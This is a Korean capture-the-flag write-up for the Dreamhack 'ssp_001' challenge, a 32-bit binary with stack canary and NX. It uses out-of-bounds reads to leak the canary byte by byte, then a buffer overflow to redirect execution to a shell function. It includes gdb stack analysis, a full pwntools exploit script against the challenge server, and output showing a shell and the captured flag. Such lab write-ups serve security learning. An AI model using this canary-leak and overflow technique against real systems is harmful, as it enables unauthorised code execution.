## ssp_001

### 보호 기법

```bash
[*] '/home/ion/wargame/dreamhack/pwnable/ssp_001/ssp_001'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

`32bit` 바이너리입니다.
`Canary`와 `NX` 방어기법이 걸려있습니다.


<br>


### 문제 코드

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(30);
}

void get_shell() {
    system("/bin/sh");
}

void print_box(unsigned char *box, int idx) {
    printf("Element of index %d is : %02x\n", idx, box[idx]);
}

void menu() {
    puts("[F]ill the box");
    puts("[P]rint the box");
    puts("[E]xit");
    printf("> ");
}

int main(int argc, char *argv[]) {
    unsigned char box[0x40] = {};
    char name[0x40] = {};
    char select[2] = {};
    int idx = 0, name_len = 0;
    initialize();
    while(1) {
        menu();
        read(0, select, 2);
        switch( select[0] ) {
            case 'F':
                printf("box input : ");
                read(0, box, sizeof(box));
                break;
            case 'P':
                printf("Element index : ");
                scanf("%d", &idx);
                print_box(box, idx);
                break;
            case 'E':
                printf("Name Size : ");
                scanf("%d", &name_len);
                printf("Name : ");
                read(0, name, name_len);
                return 0;
            default:
                break;
        }
    }
}
```

* 쉘을 띄워주는 `get_shell` 함수가 있습니다.
* 원하는 인덱스의 `box` 값을 출력해주는 `print_box` 함수가 있습니다.
* 메뉴를 출력하는 `menu` 함수가 있습니다.
* 메뉴에서 `F`를 입력하면 `box`에 입력을 받습니다.
* 메뉴에서 `P`를 입력하면 `print_box` 함수를 호출하여 해당 인덱스의 값을 출력합니다.
* 메뉴에서 `E`를 입력하면 `name_len` 변수에 이름의 크기를 입력받고 `name` 변수에 해당하는 크기 만큼 이름을 입력 받습니다.

⇾ 메뉴 `E`에서 원하는 크기만큼 `box`에 입력을 줄 수 있기 때문에 버퍼 오버플로우가 발생합니다.
⇾ 메뉴 `P`에서 인덱스를 입력 받을 때 경계값 검사를 하지 않기 때문에, 64 이상의 인덱스를 입력하여 `name` 아래에 있는 값을 출력할 수 있습니다.


<br>
<br>


### 디버깅

```bash
0x08048795 <+106>:   push   0x2                   # push 2
0x08048797 <+108>:   lea    eax,[ebp-0x8a]        # eax = select
0x0804879d <+114>:   push   eax                   # push select
0x0804879e <+115>:   push   0x0                   # push 0
0x080487a0 <+117>:   call   0x80484a0 <read@plt>  # read(0, select, 2)
0x080487a5 <+122>:   add    esp,0xc

0x080487d3 <+168>:   push   0x40                    # push 0x40
0x080487d5 <+170>:   lea    eax,[ebp-0x88]          # eax = box
0x080487db <+176>:   push   eax                     # push box
0x080487dc <+177>:   push   0x0                     # push 0
0x080487de <+179>:   call   0x80484a0 <read@plt>    # read(0, box, 0x40)
0x080487e3 <+184>:   add    esp,0xc

0x080487f8 <+205>:   lea    eax,[ebp-0x94]                  # eax = idx
0x080487fe <+211>:   push   eax                             # push idx
0x080487ff <+212>:   push   0x804898a                       # %d
0x08048804 <+217>:   call   0x8048540 <__isoc99_scanf@plt>  # scanf("%d", &idx)
0x08048809 <+222>:   add    esp,0x8

0x08048852 <+295>:   mov    eax,DWORD PTR [ebp-0x90]  # eax = name_len
0x08048858 <+301>:   push   eax                       # push name_len
0x08048859 <+302>:   lea    eax,[ebp-0x48]            # eax = name
0x0804885c <+305>:   push   eax                       # push name
0x0804885d <+306>:   push   0x0                       # push 0x0
0x0804885f <+308>:   call   0x80484a0 <read@plt>      # read(0, name, name_len)
0x08048864 <+313>:   add    esp,0xc
```

`select` = `[ebp-0x8a]`
`box` = `[ebp-0x88]`
`idx` = `[ebp-0x94]`
`name` = `[ebp-0x48]`
`name_len` = `[ebp-0x90]`


<br>


```bash
gef➤  b * main
Breakpoint 1 at 0x804872b
gef➤  r
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
    0x8048728 <menu+55>        nop    
    0x8048729 <menu+56>        leave  
    0x804872a <menu+57>        ret    
 →  0x804872b <main+0>         push   ebp
    0x804872c <main+1>         mov    ebp, esp
    0x804872e <main+3>         push   edi
    0x804872f <main+4>         sub    esp, 0x94
    0x8048735 <main+10>        mov    eax, DWORD PTR [ebp+0xc]
    0x8048738 <main+13>        mov    DWORD PTR [ebp-0x98], eax

gef➤  x/4wx $esp
0xffffd09c:     0xf7d9a519      0x00000001      0xffffd154      0xffffd15c
gef➤  x/wx 0xf7d9a519
0xf7d9a519 <__libc_start_call_main+121>:        0x8310c483
```

`RET` = `0xf7d9a519`


<br>


```bash
gef➤  ni
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
    0x8048729 <menu+56>        leave  
    0x804872a <menu+57>        ret    
    0x804872b <main+0>         push   ebp
 →  0x804872c <main+1>         mov    ebp, esp
    0x804872e <main+3>         push   edi
    0x804872f <main+4>         sub    esp, 0x94
    0x8048735 <main+10>        mov    eax, DWORD PTR [ebp+0xc]
    0x8048738 <main+13>        mov    DWORD PTR [ebp-0x98], eax
    0x804873e <main+19>        mov    eax, gs:0x14

gef➤  x/4wx $esp
0xffffd098:     0xf7ffd020      0xf7d9a519      0x00000001      0xffffd154
gef➤  x/wx 0xf7ffd020
0xf7ffd020 <_rtld_global>:      0xf7ffda40
```

`EBP` = `0xf7ffd020`


<br>


```bash
gef➤  b * main+28
Breakpoint 2 at 0x8048747
gef➤ c
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
    0x8048738 <main+13>        mov    DWORD PTR [ebp-0x98], eax
    0x804873e <main+19>        mov    eax, gs:0x14
    0x8048744 <main+25>        mov    DWORD PTR [ebp-0x8], eax
 →  0x8048747 <main+28>        xor    eax, eax
    0x8048749 <main+30>        lea    edx, [ebp-0x88]
    0x804874f <main+36>        mov    eax, 0x0
    0x8048754 <main+41>        mov    ecx, 0x10
    0x8048759 <main+46>        mov    edi, edx
    0x804875b <main+48>        rep    stos DWORD PTR es:[edi], eax

gef➤  x/8wx $ebp-0x8
0xffffd090:     0xfeee4e00      0xf7ffcb80      0xf7ffd020      0xf7d9a519
0xffffd0a0:     0x00000001      0xffffd154      0xffffd15c      0xffffd0c0
gef➤  canary
[+] The canary of process 10052 is at 0xffffd2fb, value is 0xfeee4e00
```

`canary` = `0xfeee4e00`
`canary`와 `ebp` 사이에 `0xf7ffcb80`라는 `dummy` 존재

<br>

분석한 스택을 그려보면

![stack](https://velog.velcdn.com/images/silvergun8291/post/4d9abd52-d6c1-48ca-a46d-f49df9f8d9cf/image.jpg)


<br>
<br>


### 카나리 릭

1) 메뉴 `P`를 이용하면 64 이상의 `index`를 주어 `box` 밑에 있는 값을 출력할 수 있기 때문에 이를 이용해서 카나리를 릭을 할 수 있습니다.
`box ~ canary` 까지 거리는 `128 Byte`니까 `idex`로 `128~131`을 주면 카나리 값을 릭할 수 있습니다.

```bash
ion  ~/wargame/dreamhack/pwnable/ssp_001  ./ssp_001        
[F]ill the box
[P]rint the box
[E]xit
> P
Element index : 128
Element of index 128 is : 00
[F]ill the box
[P]rint the box
[E]xit
> P
Element index : 129
Element of index 129 is : 02
[F]ill the box
[P]rint the box
[E]xit
> P   
Element index : 130
Element of index 130 is : 95
[F]ill the box
[P]rint the box
[E]xit
> P
Element index : 131
Element of index 131 is : 61
```

<br>
<br>


### 버퍼 오버플로우

메뉴 `E`를 이용하면 `box`에 원하는 크기만큼 입력을 할 수 있어 버퍼 오버플로우가 발생합니다. 이를 이용해서 `RET`를 `get_shell`로 덮으면 쉘을 띄울 수 있습니다.

```bash
'A' * 64 + canary + 'A' * 8 + get_shell
```


<br>
<br>


### 익스플로잇 코드

```python
from pwn import *

def slog(name, addr):
  return success(": ".join([name, hex(addr)]))


#context.log_level = 'debug'

p = remote("host3.dreamhack.games", 9485)
e = ELF("./ssp_001")

get_shell = e.symbols['get_shell']


# Canary Leak
canary = b""

i = 131
while i >= 128:
  p.sendlineafter("> ", 'P')
  p.sendlineafter("Element index : ", str(i))
  p.recvuntil("is : ")
  canary += p.recvn(2)
  i = i - 1

canary = int(canary, 16)
slog("canary", canary)


# BOF
payload = b'A' * 64
payload += p32(canary)
payload += b'A' * 8
payload += p32(get_shell)

p.sendlineafter("> ", 'E')
p.sendlineafter("Name Size : ", str(1000))
p.sendlineafter("Name : ", payload)

p.interactive()
```


<br>
<br>


### 익스플로잇

```bash
ion  ~/wargame/dreamhack/pwnable/ssp_001  python3 remote.py 2> /dev/null
[+] Opening connection to host3.dreamhack.games on port 9485: Done
[*] '/home/ion/wargame/dreamhack/pwnable/ssp_001/ssp_001'
   Arch:     i386-32-little
   RELRO:    Partial RELRO
   Stack:    Canary found
   NX:       NX enabled
   PIE:      No PIE (0x8048000)
[+] canary: 0x40ef4e00
[*] Switching to interactive mode
$ ls
flag
run.sh
ssp_001
$ cat flag
DH{00c609773822372daf2b7ef9adbdb824}
```
